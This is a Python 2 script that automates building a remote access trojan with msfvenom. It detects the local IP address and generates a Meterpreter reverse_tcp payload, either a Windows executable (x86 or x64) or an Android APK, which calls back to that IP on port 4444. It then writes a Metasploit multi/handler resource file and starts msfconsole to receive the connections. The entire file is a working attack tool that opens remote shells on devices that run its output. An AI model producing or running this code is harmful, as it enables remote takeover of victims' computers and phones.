#!/usr/bin/env python2

import subprocess
import optparse
import re


def get_ip():
    ifconfig_result = subprocess.check_output(["ifconfig"]).decode()
    current_ip = re.search(r"\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}", ifconfig_result)
    if (not current_ip):
        print("[-] cannot read ip addr")
    else:
        # print(current_ip.group(0))
        return (current_ip.group(0))


def get_arguments():
    parser = optparse.OptionParser()
    parser.add_option("-f", "--filename", dest="filename", help="name of the rat file")
    parser.add_option("-p", "--platform", dest="platform", help="OS and architecture of the rat file")
    (options, arguments) = parser.parse_args()
    if not options.filename:
        parser.error("[-] enter name of the rat file to be generated")
    elif not options.platform:
        parser.error("[-] Select OS and architecture of the rat file")
    else:
        return options

def get_rat(ip,filename, platform ):


    if (platform == "android"):
        os = platform
        #print(os+"test")
    elif (platform == "windows-32"):
        os = "windows"
        arch = "x86"
        #print(os+"test")
        #print(arch)
    elif (platform == "windows-64"):
        os = "windows"
        arch = "x64"
        #print(os+"test")
        #print(arch)

    if os == "windows":
        subprocess.call("msfvenom -p "+os+"/meterpreter/reverse_tcp lhost="+ip+" lport=4444 -f exe -a "+arch+"> "+filename+".exe",
                    shell=True )
    elif os == "android":
        subprocess.call( "msfvenom -p "+os+"/meterpreter/reverse_tcp LHOST="+ip+" LPORT=4444 -o "+filename+".apk",
                     shell=True)
    else:
        print("[-] Error occured")

    subprocess.call("touch mpt.rc", shell=True)
    subprocess.call("echo use multi/handler > mpt.rc ", shell=True)
    if os == "windows":
        subprocess.call("echo set payload windows/meterpreter/reverse_tcp >> mpt.rc ", shell=True)
    elif os == "android":
        subprocess.call("echo set payload android/meterpreter/reverse_tcp >> mpt.rc ", shell=True)
    subprocess.call("echo set lhost "+ip+" >> mpt.rc ", shell=True)
    subprocess.call("echo set lport 4444 >> mpt.rc ", shell=True)
    subprocess.call("echo exploit >> mpt.rc ", shell=True)
    subprocess.call("msfconsole -r mpt.rc ", shell=True)

options= get_arguments()
get_rat(get_ip(), options.filename, options.platform)
    #subprocess.call(["msfvenom", "-p", "windows/meterpreter/reverse_tcp", "lhost="+ip , "lport=4444", "-f", "exe", "-a" , "x86>", filename+".exe"])






